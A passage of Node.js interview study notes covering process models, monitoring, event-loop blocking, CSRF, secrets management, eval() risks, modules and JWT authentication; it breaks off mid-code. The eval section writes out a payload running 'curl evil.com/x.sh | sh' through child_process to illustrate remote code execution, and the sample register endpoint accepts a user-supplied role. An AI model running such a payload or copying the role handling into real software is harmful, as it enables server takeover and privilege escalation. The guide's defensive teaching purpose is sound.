| Memory | Separate | Separate V8, can share Buf | Separate |
| Startup cost | High | Low–medium | High (but once at boot) |
| IPC cost | High (serialize) | Low (postMessage, shared) | High (serialize) |
| Crash impact | Parent survives | Can crash whole process | Other workers survive |
| Best for | External programs | CPU-bound JS work | Scaling HTTP servers |
| Shared memory | ❌ | ✅ (`SharedArrayBuffer`) | ❌ |

### Architecture Diagram

`┌─────────────────────── CHILD PROCESS ───────────────────────┐
│  Parent Node process                                        │
│     │   fork('./child.js')                                  │
│     │──────────────► Child Node process (own V8, own heap)  │
│     │    IPC        (separate memory, pipe communication)   │
│     ◄──────────────                                         │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────── WORKER THREADS ──────────────────────┐
│  Single Node process                                        │
│  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐     │
│  │ Main thread  │   │ Worker 1     │   │ Worker 2     │     │
│  │ (event loop) │◄─►│ (event loop) │◄─►│ (event loop) │     │
│  └──────────────┘   └──────────────┘   └──────────────┘     │
│         ▲                                                   │
│         └── MessageChannel + optional SharedArrayBuffer     │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────── CLUSTERING ──────────────────────────┐
│                    Primary process                          │
│                          │                                  │
│            ┌─────────────┼─────────────┐                    │
│            ▼             ▼             ▼                    │
│     ┌──────────┐  ┌──────────┐  ┌──────────┐                │
│     │ Worker 1 │  │ Worker 2 │  │ Worker 3 │ (full Node)    │
│     └────┬─────┘  └────┬─────┘  └────┬─────┘                │
│          └─────────────┴─────────────┘                      │
│                        ▼                                    │
│             Shared listening socket (port 3000)             │
│               OS load-balances connections                  │
└─────────────────────────────────────────────────────────────┘`

### When to Pick Which

- **CPU-heavy JS inside your app (image resize, crypto, parsing large CSV):** Worker Threads.
- **Running an external binary (ffmpeg, python ML script):** Child Process (`spawn`).
- **Scaling an HTTP server across all CPU cores on one box:** Clustering (or PM2, or multiple container replicas which is the modern preference).
- **Isolating unstable / untrusted code so a crash doesn't take down the main app:** Child Process.

### Summary

Child processes give full OS-level isolation at a high cost — use them for external binaries or crash-prone code. Worker threads are lighter and share the process, ideal for CPU-bound JS work with shared memory. Clustering forks multiple copies of your server to use all CPU cores and share one port. In production today, container replicas often replace the `cluster` module, but the underlying idea is the same: one Node process per core.

1. How would you monitor and profile a Node.js application in production?

Monitoring answers *"is it healthy right now?"*; profiling answers *"why is it slow / leaking / crashing?"*. You need both.

### What to Monitor (the Signals)

Follow the **"Four Golden Signals"** (Google SRE): **Latency, Traffic, Errors, Saturation**. For Node specifically, add:

1. **Event loop lag** — the delay between when a timer should fire and when it actually fires. The single most important Node-specific metric.
2. **Heap usage** — `heapUsed`, `heapTotal`, `rss`, `external`.
3. **GC pauses** — duration and frequency.
4. **Active handles & requests** — `process._getActiveHandles()`, `process._getActiveRequests()`.
5. **HTTP metrics** — request rate, p50/p95/p99 latency, error rate by status code.
6. **Downstream dependencies** — DB query time, Redis latency, external API latency.

### Measuring Event Loop Lag

```jsx
const { monitorEventLoopDelay } = require('perf_hooks');
const h = monitorEventLoopDelay({ resolution: 20 });
h.enable();

setInterval(() => {
  console.log({
    p50: (h.percentile(50) / 1e6).toFixed(2) + ' ms',
    p99: (h.percentile(99) / 1e6).toFixed(2) + ' ms',
    max: (h.max / 1e6).toFixed(2) + ' ms',
  });
  h.reset();
}, 10_000);
```

Alert if p99 event loop lag goes above ~50 ms — users will feel it.

### Tooling Landscape

| Concern | Tool Options |
| --- | --- |
| Metrics | Prometheus + Grafana, Datadog, New Relic, Dynatrace |
| Logs | Pino/Winston → ELK (Elasticsearch/Logstash/Kibana), Loki, Datadog |
| Traces | OpenTelemetry → Jaeger, Tempo, Honeycomb, Datadog APM |
| Errors | Sentry, Rollbar, Bugsnag |
| CPU profiling | Chrome DevTools (`--inspect`), 0x, clinic flame |
| Heap profiling | Chrome DevTools, clinic heapprofiler |
| Holistic diagnosis | clinic.js doctor / bubbleprof |
| Synthetic checks | Pingdom, UptimeRobot, Checkly |

### Exposing Prometheus Metrics

```jsx
const express = require('express');
const client = require('prom-client');

const app = express();
client.collectDefaultMetrics(); // CPU, memory, event loop lag, GC, etc.

const httpDuration = new client.Histogram({
  name: 'http_request_duration_seconds',
  help: 'HTTP request duration',
  labelNames: ['method', 'route', 'status'],
  buckets: [0.01, 0.05, 0.1, 0.3, 0.5, 1, 2, 5],
});

app.use((req, res, next) => {
  const end = httpDuration.startTimer();
  res.on('finish', () => end({
    method: req.method,
    route: req.route?.path ?? 'unknown',
    status: res.statusCode,
  }));
  next();
});

app.get('/metrics', async (_req, res) => {
  res.set('Content-Type', client.register.contentType);
  res.end(await client.register.metrics());
});
```

### CPU Profiling in Production (Safely)

Production profiling needs to be quick and low-overhead.

```jsx
const inspector = require('inspector');
const fs = require('fs');
const session = new inspector.Session();
session.connect();

function captureCPUProfile(durationMs = 10_000) {
  return new Promise((resolve, reject) => {
    session.post('Profiler.enable', () => {
      session.post('Profiler.start', () => {
        setTimeout(() => {
          session.post('Profiler.stop', (err, { profile }) => {
            if (err) return reject(err);
            fs.writeFileSync(`cpu-${Date.now()}.cpuprofile`, JSON.stringify(profile));
            resolve();
          });
        }, durationMs);
      });
    });
  });
}
// Trigger via an admin endpoint (authenticated!) when latency spikes.
```

Load the `.cpuprofile` in Chrome DevTools → Performance → Load profile.

### Flame Graphs

Use `0x` locally against a load test to see which functions dominate CPU:

```bash
npm i -g 0x
0x -- node server.js
# Then run load: autocannon -c 100 -d 30 http://localhost:3000/
# 0x writes a flamegraph.html
```

Wide boxes at the top of the flame graph = functions where you're actually spending time. That's where optimization matters.

### Structured Logging

Use **Pino** in production — it's one of the fastest Node loggers and outputs JSON that your log aggregator can index:

```bash
const pino = require('pino');
const logger = pino({ level: process.env.LOG_LEVEL || 'info' });

logger.info({ userId: 42, route: '/order' }, 'order placed');
```

### Summary

In production, continuously collect metrics (latency, errors, traffic, saturation, event loop lag, heap, GC) via Prometheus/Grafana or an APM, structured JSON logs via Pino, distributed traces via OpenTelemetry, and error reports via Sentry. Set SLO-based alerts on p99 latency and event loop lag. When something goes wrong, capture CPU profiles and heap snapshots on demand via `inspector` or a safe admin endpoint, and analyze them in Chrome DevTools or with `0x` flame graphs.

1. What are some ways to prevent blocking the event loop?

Node.js runs all JavaScript on a single thread. Anything that takes too long on that thread delays every other request, timer, and I/O callback. "Too long" is workload-dependent, but a common guideline is **< 10 ms per tick** for latency-sensitive APIs.

### Rule 1 — Never Call `Sync` APIs on the Hot Path

```bash
// ❌ Blocks event loop for milliseconds per request
const data = fs.readFileSync('config.json');

// ✅ Non-blocking
const data = await fs.promises.readFile('config.json');
```

The same applies to `crypto.pbkdf2Sync`, `zlib.gzipSync`, `child_process.execSync`, etc. Sync versions are fine at startup; they are poison in a request handler.

### Rule 2 — Break Up Long Loops

If you must process a big array, yield to the event loop:

```bash
// ❌ Blocks for the whole duration
function processAll(items) {
  for (const item of items) heavyWork(item);
}

// ✅ Yields to the loop every chunk
async function processAll(items) {
  const CHUNK = 100;
  for (let i = 0; i < items.length; i += CHUNK) {
    items.slice(i, i + CHUNK).forEach(heavyWork);
    await new Promise(setImmediate);
  }
}
```

`await new Promise(setImmediate)` gives I/O callbacks a chance to run between chunks.

### Rule 3 — Offload CPU-Bound Work to Worker Threads

```bash
const { Worker } = require('worker_threads');

function hashPassword(password) {
  return new Promise((resolve, reject) => {
    const worker = new Worker('./hash-worker.js', { workerData: password });
    worker.on('message', resolve);
    worker.on('error', reject);
  });
}
```

Use a pool (e.g., `piscina`) so you don't pay the worker startup cost every call.

### Rule 4 — Stream, Don't Buffer

```bash
// ❌ Reads entire file into memory (slow + blocks on parse)
const json = JSON.parse(fs.readFileSync('huge.json'));

// ✅ Stream parse
const { pipeline } = require('stream/promises');
const StreamArray = require('stream-json/streamers/StreamArray');
await pipeline(
  fs.createReadStream('huge.json'),
  StreamArray.withParser(),
  async function* (source) {
    for await (const { value } of source) handle(value);
  }
);
```

### Rule 5 — Watch Out for JSON on Large Payloads

`JSON.parse` and `JSON.stringify` are synchronous and scale with input size. A 50 MB payload can block the loop for hundreds of milliseconds. Mitigations: streaming parsers (`stream-json`), size limits on request bodies, pagination.

### Rule 6 — Beware of RegExp Catastrophic Backtracking

A bad regex against attacker-controlled input can hang the event loop indefinitely (ReDoS). Validate regex complexity, use `safe-regex`, or switch to a RE2-based library (`re2`) which has linear-time guarantees.

### Rule 7 — Avoid Huge Synchronous Template / String Building

Rendering a 500-page report as one string blocks. Stream response bodies instead.

### Monitoring

Always keep a production event-loop-lag metric (see Q4). If lag spikes, you have a blocker somewhere — correlate with deploy times and request volume.

### Summary

Keep the event loop free by avoiding sync APIs, breaking long loops with `setImmediate`, offloading CPU-bound work to Worker Threads (ideally pooled with `piscina`), streaming large payloads instead of buffering, limiting request body size, guarding against ReDoS, and measuring event loop lag continuously so regressions are caught immediately.

1. **How does CSRF protection work in an API, and do you need it in a RESTful service?**

### What CSRF Is

**Cross-Site Request Forgery (CSRF)** tricks a logged-in user's browser into silently sending an authenticated request to a target site. The attack depends on **credentials being attached automatically by the browser** — classically, cookies.

### Attack Flow

  `User's browser                                 Attacker's site
  ┌─────────────┐                              ┌────────────────┐
  │             │  1. User logs into bank.com   │                │
  │  Logged in  │  ─────────────────────────►   │                │
  │  to bank.com│  (session cookie stored)      │                │
  │             │                               │                │
  │             │  2. User visits evil.com      │                │
  │             │  ◄───────────────────────────│  Serves HTML:  │
  │             │                               │  <form action= │
  │             │                               │  "bank.com/    │
  │             │                               │   transfer"    │
  │             │                               │   method=POST> │
  │             │                               │  <script>      │
  │             │                               │  form.submit() │
  │             │  3. Auto-submit to bank.com   │                │
  │             │  ─── + session cookie ───►    │                │
  │             │       bank.com processes it   │                │
  └─────────────┘       because cookie is valid └────────────────┘`

The browser attaches the bank's session cookie to the cross-origin request because that's how cookies work by default. The server has no easy way to tell the request came from evil.com vs. from bank.com's own UI.

### Protection Techniques

**1. Synchronizer Token Pattern (classic CSRF token)**

Server issues a random token tied to the session; the UI must include it in every state-changing request (header or form field). Attacker's site cannot read the token because of the same-origin policy.

```bash
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', (req, res) => {
  // csurf middleware validates req.body._csrf or X-CSRF-Token header
  res.send('Transfer done');
});
```

**2. Double-Submit Cookie**

Server sets a random value in a cookie; the client JS reads it and sends it back in a custom header. The server compares header vs. cookie. Because cross-origin JS can't read the cookie, an attacker can't forge a match.

**3. SameSite Cookies**

Modern browsers honor the `SameSite` cookie attribute:

- `Strict` — cookie never sent on cross-site requests.
- `Lax` — sent on top-level GETs only (default in modern Chrome/Firefox).
- `None` — sent always (requires `Secure`).

```bash
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
});
```

`SameSite=Lax` eliminates most CSRF vectors with zero code changes. It is the first line of defense today.

**4. Custom Request Headers**

Requiring a header like `X-Requested-With: XMLHttpRequest` helps because:

- Simple cross-origin requests can't set custom headers without a CORS preflight.
- The preflight fails unless your server explicitly allows it.

### Do You Need CSRF Protection in a REST API?

**It depends on how you authenticate.**

| Auth mechanism | Browser auto-sends credentials? | CSRF risk | Need CSRF protection? |
| --- | --- | --- | --- |
| Session cookie | ✅ Yes | High | ✅ Yes |
| `Authorization: Bearer <JWT>` in header | ❌ No (client code must attach) | None | ❌ No |
| API key in custom header | ❌ No | None | ❌ No |
| HTTP Basic Auth | ✅ Yes (if browser cached) | Yes | ✅ Yes |
| Native mobile app with bearer token | ❌ No (not a browser) | None | ❌ No |

**The rule of thumb:** if credentials travel in something the browser attaches automatically (cookies, basic auth), you need CSRF protection. If your API relies on a bearer token or API key that JS must explicitly attach, there is no CSRF because an attacker's site has no access to that token.

**Hybrid case — cookie-based JWT:** If you store the JWT in a cookie (often done for `httpOnly` security), CSRF is back on the menu. Use SameSite + a CSRF token.

### Summary

CSRF exploits the browser's habit of auto-attaching cookies to cross-origin requests. Protect with `SameSite` cookies first, then CSRF tokens (synchronizer or double-submit), and consider requiring custom headers. In a REST API using bearer tokens in the `Authorization` header, CSRF protection is unnecessary because nothing attaches the token automatically; in any API using cookie-based sessions (including cookie-stored JWTs), CSRF protection is mandatory.

1. What are the best practices for handling sensitive data (env variables, secrets management)?

Secrets include API keys, DB passwords, JWT signing keys, private certificates, OAuth client secrets, and encryption keys. A leaked secret has sunk companies.

### 1. Never Hardcode Secrets

```jsx
// ❌ DO NOT DO THIS
const stripe = new Stripe('sk_live_51H...'); // will get committed, pushed, scraped

// ✅ Load from environment
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY);
```

### 2. Use `.env` Files Only for Local Dev

`dotenv` is fine on your laptop. It is **not** a production secrets solution.

bash

```bash
# .env (local only)
DATABASE_URL=postgres://localhost/app
STRIPE_SECRET_KEY=sk_test_...
```

```jsx
// Only in dev — not in production
if (process.env.NODE_ENV !== 'production') require('dotenv').config();
```

Add `.env` to `.gitignore`. Commit a `.env.example` with dummy values so teammates know what's needed.

### 3. Validate Environment at Startup

Fail fast if a required secret is missing — much better than discovering it 30 minutes later when a user hits a payment endpoint.

```jsx
const { z } = require('zod');

const envSchema = z.object({
  NODE_ENV: z.enum(['development', 'test', 'production']),
  PORT: z.coerce.number().default(3000),
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
});

const env = envSchema.parse(process.env);
module.exports = env;
```

### 4. Use a Real Secrets Manager in Production

Choose one and standardize on it:

- **AWS Secrets Manager** / **AWS SSM Parameter Store (SecureString)**
- **HashiCorp Vault**
- **Google Cloud Secret Manager**
- **Azure Key Vault**
- **Doppler**, **1Password Secrets Automation**, **Infisical**

Your app fetches secrets at startup (or on demand) using its workload identity — no static keys on disk.

```jsx
const { SecretsManagerClient, GetSecretValueCommand } =
  require('@aws-sdk/client-secrets-manager');

const client = new SecretsManagerClient({ region: 'us-east-1' });

async function loadSecrets() {
  const { SecretString } = await client.send(
    new GetSecretValueCommand({ SecretId: 'prod/myapp/db' })
  );
  const parsed = JSON.parse(SecretString);
  process.env.DATABASE_URL = parsed.DATABASE_URL;
}
```

### 5. Prefer Workload Identity Over Long-Lived Keys

On AWS, give your ECS task / EC2 / Lambda an **IAM Role** — the SDK gets short-lived credentials automatically. GCP has Workload Identity; Azure has Managed Identities; Kubernetes has service accounts + OIDC. You should rarely need to handle AWS access keys manually.

### 6. Rotate Secrets Regularly

- Automate rotation (Secrets Manager can rotate RDS credentials on a schedule).
- Design code to handle rotation without downtime (e.g., accept both old and new signing keys during cutover).

### 7. Encrypt at Rest and in Transit

- Secrets at rest in your secrets manager are encrypted with KMS — don't write them to logs, `console.log`, or error reports.
- Always connect to DBs, Redis, and internal services over TLS.

### 8. Never Log Secrets

```jsx
// ❌
logger.info({ user }, 'login'); // user object might contain passwordHash

// ✅ Define explicit allowlists
logger.info({ userId: user.id, email: user.email }, 'login');
```

Pino has a `redact` option for this:

```jsx
const logger = pino({ redact: ['password', '*.password', 'authorization'] });
```

### 9. Scan for Leaks

- Install **git-secrets**, **gitleaks**, or **trufflehog** as a pre-commit hook and CI check.
- Enable GitHub's secret scanning.
- If a key leaks, **rotate immediately** — revocation is more important than cleaning git history.

### 10. Principle of Least Privilege

Each service's credentials should have only the minimum permissions it needs — read-only DB creds where possible, scoped API keys, per-service IAM roles. Limits blast radius when something leaks.

### Summary

Keep secrets out of code and out of git. Use `.env` + `dotenv` only for local development, and a dedicated secrets manager (AWS Secrets Manager, Vault, GCP Secret Manager) in production, ideally accessed via workload identity instead of long-lived keys. Validate required env at startup, rotate regularly, encrypt at rest and in transit, scrub secrets from logs, scan repos for leaks, and follow least privilege.

1. What security risks does `eval()` pose in a Node.js app?

`eval(string)` takes a JavaScript string and executes it with the full privileges of the calling code. In Node.js, that's **the entire operating system process** — file system, network, child processes, environment variables, everything.

### The Core Risk — Arbitrary Code Execution

If any portion of the string comes from user input, directly or indirectly, the attacker can run any Node code they want.

```jsx
// 💣 Disaster
app.get('/calc', (req, res) => {
  const result = eval(req.query.expr);
  res.send(String(result));
});
```

A request like:

`GET /calc?expr=require('child_process').execSync('curl evil.com/x.sh | sh').toString()`

…gives the attacker a shell on your server. Game over: they can read secrets, exfiltrate your database, pivot into your network, and install persistence.

### Other Problems With `eval`

1. **Scope leakage.** Direct `eval` can access and modify local variables in the enclosing scope, breaking encapsulation and making static analysis useless.
2. **V8 de-optimization.** Functions containing `eval` can't be optimized as aggressively; code runs measurably slower.
3. **Strict mode surprises.** Behavior differs between strict and non-strict modes in subtle ways.
4. **Debuggability.** Stack traces point into anonymous `eval` code with no source map.
5. **Bypasses CSP-like defenses** in any hybrid context (e.g., Electron renderers where CSP matters).

### Other Functions With Similar Risk

These are all variants of `eval` and equally dangerous with untrusted input:

```jsx
new Function('code');                 // like eval but without local scope access
setTimeout('alert(1)', 100);          // string form — runs eval under the hood
setInterval('work()', 1000);          // same
vm.runInThisContext(code);            // no sandboxing against the Node API
vm.runInNewContext(code);             // isolates globals but NOT truly a sandbox
```

> **Warning:** The `vm` module is *not* a security boundary. It isolates variable scope but not the Node runtime. A crafted payload can escape `vm` contexts. Use a real sandbox like **`isolated-vm`** or run the code in a separate process / container if you must run untrusted code.
> 

### Safe Alternatives By Use Case

| You want to… | Use this instead of `eval` |
| --- | --- |
| Parse JSON from a string | `JSON.parse(str)` |
| Dynamically pick a function by name | Lookup table / `Map` |
| Dynamically load a module | `await import(path)` (validate path!) |
| Evaluate a math expression from the user | **`mathjs`**, **`expr-eval`** |
| Template strings / user-supplied formulas | A small, custom parser or Handlebars-style template engine |
| Run untrusted user code | **`isolated-vm`**, container, or WASM |

### Examples

```jsx
// ❌ Dangerous
function callHandler(name, data) {
  return eval(name + '(data)');
}

// ✅ Lookup table
const handlers = { create, update, remove };
function callHandler(name, data) {
  const fn = handlers[name];
  if (!fn) throw new Error('Unknown handler');
  return fn(data);
}
```

```jsx
// ❌ Dangerous math evaluator
app.post('/calc', (req, res) => res.json({ value: eval(req.body.expr) }));

// ✅ Safe math evaluator
const { evaluate } = require('mathjs');
app.post('/calc', (req, res) => {
  try {
    res.json({ value: evaluate(req.body.expr) });
  } catch (err) {
    res.status(400).json({ error: 'Invalid expression' });
  }
});
```

### Defense in Depth (When You Must Accept Code-Like Input)

1. **Validate + whitelist** input strictly (regex for allowed characters/tokens only).
2. **Run in an isolated process** with OS-level limits (`-max-old-space-size`, `ulimit`, container quotas, seccomp).
3. **Use `isolated-vm`** for true JS sandboxing with memory and CPU caps.
4. **Drop privileges** — run the sandboxed worker as an unprivileged user with no network access.
5. **Timeouts** — kill the worker if execution exceeds a limit.

### Summary

`eval()` (and its cousins `new Function`, string-form `setTimeout`, and `vm.runInThisContext`) is extremely dangerous in Node.js because a single tainted input gives an attacker full process control — RCE, data theft, lateral movement. It also hurts performance and debuggability. Use `JSON.parse` for data, lookup tables for dynamic dispatch, dynamic `import()` for modules, and a proper library like `mathjs` for expressions. If you absolutely must run untrusted code, use `isolated-vm` or a real sandbox (separate process + container + resource limits) — never `eval` and never the built-in `vm` module alone.

1. Difference between CommonJS (`require()`) and ES6 (`import`)

## Difference between CommonJS (`require()`) and ES6 (`import`)

### CommonJS (CJS)

- **Default module system in Node.js** (older approach).
- Uses `require()` to import and `module.exports` / `exports` to export.
- **Synchronous** loading — files are loaded and parsed one after another.
- Modules are loaded at **runtime** (dynamic).
- Uses `.js` extension by default (or `.cjs`).

```jsx
// math.js
function add(a, b) { return a + b; }
function sub(a, b) { return a - b; }
module.exports = { add, sub };

// app.js
const { add, sub } = require('./math');
console.log(add(2, 3));  // 5
```

### ES6 Modules (ESM)

- Standard JavaScript module system (used in browsers too).
- Uses `import` and `export` keywords.
- **Asynchronous** loading — supports top-level `await`.
- **Statically analyzed** at compile time → enables **tree-shaking** (removing unused code).
- Must either use `.mjs` extension OR set `"type": "module"` in `package.json`.

```jsx
// math.mjs
export function add(a, b) { return a + b; }
export function sub(a, b) { return a - b; }

// app.mjs
import { add, sub } from './math.mjs';
console.log(add(2, 3));  // 5
```

### Key Differences Table

| Feature | CommonJS (`require`) | ES6 (`import`) |
| --- | --- | --- |
| Loading | Synchronous | Asynchronous |
| Analysis | Runtime (dynamic) | Compile-time (static) |
| Tree-shaking | ❌ Not supported | ✅ Supported |
| Top-level `await` | ❌ No | ✅ Yes |
| File extension | `.js` / `.cjs` | `.mjs` or `"type":"module"` |
| `this` at top | `module.exports` | `undefined` |
| Used in browsers | ❌ No | ✅ Yes |

### 📌 Summary

CommonJS uses `require()` and is synchronous, dynamic, and the default in Node.js. ES6 modules use `import`/`export`, are asynchronous, statically analyzed (enabling tree-shaking), and are the standard across JavaScript runtimes.

1. How to Create Modules in Node.js

A **module** is a reusable block of code whose existence does not accidentally affect other code. In Node.js, **every file is a module**.

### Method 1: Exporting a single value

```jsx
// greet.js
module.exports = function(name) {
  return `Hello, ${name}!`;
};

// app.js
const greet = require('./greet');
console.log(greet('Alice'));   // Hello, Alice!
```

### Method 2: Exporting multiple values (object)

```jsx
// calculator.js
function add(a, b) { return a + b; }
function multiply(a, b) { return a * b; }

module.exports = { add, multiply };

// app.js
const calc = require('./calculator');
console.log(calc.add(2, 3));        // 5
console.log(calc.multiply(4, 5));   // 20
```

### Method 3: Using `exports` shorthand

```jsx
// utils.js
exports.square = (x) => x * x;
exports.cube = (x) => x * x * x;
```

⚠️ **Warning:** Don't reassign `exports = ...` directly — it breaks the reference. Use `module.exports = ...` instead.

### Method 4: ES6 named + default exports

```jsx
// shapes.mjs
export const PI = 3.14;
export function area(r) { return PI * r * r; }
export default class Circle { /* ... */ }

// app.mjs
import Circle, { PI, area } from './shapes.mjs';
```

### Types of Modules in Node.js

1. **Core/Built-in** — `fs`, `http`, `path`, `os` (shipped with Node).
2. **Local** — your own files (`./myModule`).
3. **Third-party** — installed from npm (`express`, `lodash`).

### 📌 Summary

Modules are created by exporting values via `module.exports` (CommonJS) or `export` keyword (ES6). Every `.js` file is automatically a module. You can export a single function, a class, or an object of multiple items, and consume them using `require()` or `import`.

1. How to Implement Error Handling in Node.js

Error handling in Node.js depends on whether the code is **synchronous**, **callback-based**, or **promise-based**.

### A) Synchronous Errors — `try...catch`

```jsx
try {
  const data = JSON.parse(invalidJson);
} catch (err) {
  console.error('Parsing failed:', err.message);
}
```

### B) Callback Errors — Error-first callbacks

Node.js convention: the **first argument** of a callback is always an error.

```jsx
const fs = require('fs');
fs.readFile('file.txt', 'utf8', (err, data) => {
  if (err) return console.error('Read failed:', err);
  console.log(data);
});
```

### C) Promise Errors — `.catch()`

```jsx
fetchUser(id)
  .then(user => console.log(user))
  .catch(err => console.error('Error:', err));
```

### D) async/await — `try...catch`

```jsx
async function getUser(id) {
  try {
    const user = await fetchUser(id);
    return user;
  } catch (err) {
    console.error('Failed:', err);
    throw err; // re-throw if caller needs to know
  }
}
```

### E) Custom Error Classes

```jsx
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = 'ValidationError';
    this.field = field;
    this.statusCode = 400;
  }
}

throw new ValidationError('Email is required', 'email');
```

### F) Global Handlers (last line of defense)

```jsx
process.on('uncaughtException', (err) => {
  console.error('Uncaught:', err);
  process.exit(1); // Best practice: exit and let a process manager restart
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection:', reason);
});
```

### G) Express Error-Handling Middleware

```jsx
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(err.statusCode || 500).json({ error: err.message });
});
```

### Error Flow Diagram

`┌───────────────────────────────────────────────────────┐
│                   ERROR OCCURS                        │
└────────────────────────┬──────────────────────────────┘
                         │
         ┌───────────────┼───────────────┐
         ▼               ▼               ▼
      Sync Code      Callback        Promise/async
         │               │               │
      try/catch     if(err) return    try/catch
                                    or .catch()
         │               │               │
         └───────────────┼───────────────┘
                         ▼
              Express error middleware
                         │
                         ▼
           Global: uncaughtException /
                unhandledRejection
                         │
                         ▼
              Log → Exit → Restart (PM2)`

### 📌 Summary

Use `try/catch` for sync and `async/await` code, `.catch()` for promises, and error-first callbacks for older APIs. Create custom error classes for domain-specific errors. Use Express error middleware for web apps, and global handlers (`uncaughtException`, `unhandledRejection`) as a safety net — then restart via a process manager.

1. Difference between Threading and Concurrency

### Threading

A **thread** is the smallest unit of execution within a process. **Multi-threading** means running multiple threads within the same process, sharing memory.

### Concurrency

Concurrency is the ability of a system to **handle multiple tasks at once** — not necessarily executing them simultaneously. It's about *dealing with* many things at once.

### Key Distinction

- **Threading** is a *mechanism* (how you run code).
- **Concurrency** is a *property/goal* (managing multiple tasks).

You can achieve concurrency **without threads** — Node.js is the perfect example! It is single-threaded yet highly concurrent via its **event loop**.

### Visualization

`THREADING (multi-threaded)
  ┌─── Thread 1 ───────► Task A
  │
Process ── Thread 2 ───────► Task B
  │
  └─── Thread 3 ───────► Task C

CONCURRENCY (single-threaded, like Node.js)
  ┌────► Task A ─┐    ┌──► Task A (resume) ─┐
  │              │    │                     │
Thread ─► Task B ┼────┤──► Task B (resume) ─┤─► ...
  │              │    │                     │
  └────► Task C ─┘    └──► Task C (resume) ─┘
       (interleaved via event loop)`

### Node.js Example (Concurrency without threading)

javascript

`// Three async tasks run "concurrently" on a single thread
Promise.all([
  fetch('/api/users'),
  fetch('/api/posts'),
  fetch('/api/comments')
]).then(results => console.log(results));`

### 📌 Summary

**Threading** is using multiple threads to execute code; **concurrency** is the broader concept of managing multiple tasks making progress. Node.js proves you can have high concurrency with a single main thread by using an event loop and non-blocking I/O.

1. **Parallelism vs Concurrency**

These terms are often confused but are **distinct**.

### Concurrency

- Multiple tasks **making progress** over the same time period.
- Tasks are **interleaved** (time-sliced) on one CPU.
- About **structure** — managing many tasks.

### Parallelism

- Multiple tasks **executing at literally the same instant**.
- Requires **multiple CPU cores** (or machines).
- About **execution** — doing many things simultaneously.

### The Classic Analogy

> **Concurrency** = one chef juggling three dishes, switching between them.
> 
> 
> **Parallelism** = three chefs each cooking one dish at the same time.
> 

### Visualization

`CONCURRENCY (1 CPU core, time-sliced)
Time →
Core 1: [A][B][A][C][B][A][C][B][C]...

PARALLELISM (3 CPU cores, true simultaneous)
Time →
Core 1: [A][A][A][A][A][A]...
Core 2: [B][B][B][B][B][B]...
Core 3: [C][C][C][C][C][C]...

BOTH (e.g. Node.js cluster with async I/O)
Core 1: [A1][B1][A1][C1]...  (concurrent on this core)
Core 2: [A2][B2][A2][C2]...  (concurrent on this core)
    ↑ these cores run in parallel`

### In Node.js

- **Concurrency** → via the event loop (non-blocking I/O).
- **Parallelism** → via `cluster` module, `worker_threads`, or multiple processes.

```jsx
// Parallelism example with worker threads
const { Worker } = require('worker_threads');
for (let i = 0; i < 4; i++) {
  new Worker('./heavy-task.js');  // Each runs on a different core
}
```

### 📌 Summary

**Concurrency** is about *dealing* with many tasks at once (interleaved); **parallelism** is about *doing* many tasks at once (simultaneous). Concurrency can exist on a single core; parallelism requires multiple cores. Node.js is concurrent by default and parallel when using clusters or worker threads.

1. Difference between `package.json` and `package-lock.json`

### `package.json`

- The **project manifest** / blueprint.
- Created by `npm init`.
- Contains metadata: name, version, scripts, dependencies (with **version ranges** like `^1.2.0`).
- **Hand-editable**.

```json
{
  "name": "my-app",
  "version": "1.0.0",
  "scripts": { "start": "node index.js" },
  "dependencies": {
    "express": "^4.18.0",    // ^ allows 4.x.x updates
    "lodash": "~4.17.0"      // ~ allows 4.17.x updates
  }
}
```

### `package-lock.json`

- The **exact snapshot** of the installed dependency tree.
- Auto-generated by npm when you run `npm install`.
- Records the **exact version** of every package (including nested sub-dependencies).
- Ensures **reproducible builds** — everyone installs identical versions.
- **Should NOT be hand-edited**; should be committed to Git.

```json
{
  "packages": {
    "node_modules/express": {
      "version": "4.18.2",
      "resolved": "https://registry.npmjs.org/...",
      "integrity": "sha512-..."
    }
  }
}
```

### Why Both?

`package.json:          "express": "^4.18.0"  (range)
                              │
                              ▼
                       npm install
                              │
                              ▼
package-lock.json:     "express": "4.18.2"   (exact)`

Without `package-lock.json`, two developers running `npm install` on different days might get different versions of the same dependency (say 4.18.2 vs 4.19.0), causing hard-to-debug "works on my machine" bugs.

### 📌 Summary

`package.json` describes *what* you want (with flexible version ranges); `package-lock.json` describes *exactly what was installed* (pinned versions + full dependency tree). The former is your intent, the latter guarantees reproducible installs across teams and environments. Always commit both.

1. How to Handle Authentication and Authorization in Node.js

### Definitions

- **Authentication** = *Who are you?* (verifying identity — login)
- **Authorization** = *What are you allowed to do?* (checking permissions)

### Auth Flow Diagram

  `CLIENT                          SERVER
    │                               │
    │── POST /login (user+pass) ──► │
    │                               │ → Verify password (bcrypt)
    │                               │ → Generate JWT
    │◄── JWT token ─────────────────│
    │                               │
    │── GET /profile + token ─────► │
    │                               │ → Verify JWT (middleware)
    │                               │ → Check role (authorization)
    │◄── Protected data ────────────│`

### Example: JWT Authentication + Role Authorization

```jsx
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const app = express();
app.use(express.json());

const SECRET = process.env.JWT_SECRET;
const users = []; // Replace with a database

// ─── REGISTER ─────────────────────────────────────────
app.post('/register', async (req, res) => {
  const { username, password, role = 'user' } = req.body;
  const hashed = await bcrypt.hash(password, 10);   // Hash password
  users.push({ username, password: hashed, role });
  res.status(201).json({ message: 'User registered' });
});

// ─── LOGIN ────────────────────────────────────────────
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = users.find(u => u.username === username);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const valid = await bcrypt.compare(password, user.password);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  const token = jwt.sign(
    { username: user.username, role: user.role },
